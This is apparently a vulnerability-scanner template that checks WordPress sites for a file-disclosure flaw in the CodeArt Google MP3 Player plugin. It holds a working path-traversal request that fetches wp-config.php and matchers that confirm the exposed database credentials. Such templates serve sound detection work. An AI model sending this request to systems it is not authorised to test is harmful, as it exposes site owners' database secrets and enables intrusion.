id: "wp-googlemp3-lfi"
name: "WordPress Plugin CodeArt Google MP3 Player - File Disclosure Download"
severity: "critical"
description: "WordPress Plugin CodeArt Google MP3 Player allows an unauthenticated attacker to download file from server."
tech:
  - "wordpress"
  - "php"
tags:
  - "wp-plugin"
  - "wp"
  - "wordpress"
  - "lfi"
  - "google-mp3-audio-player"
  - "unauth"
  - "disclosure"
  - "vuln"
reference: "https://www.exploit-db.com/exploits/35460"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../wp-config.php"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "DB_USER"
      - "DB_PASSWORD"
      - "DB_HOST"
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "application/octet-stream"
  - type: "status"
    status:
      - 200
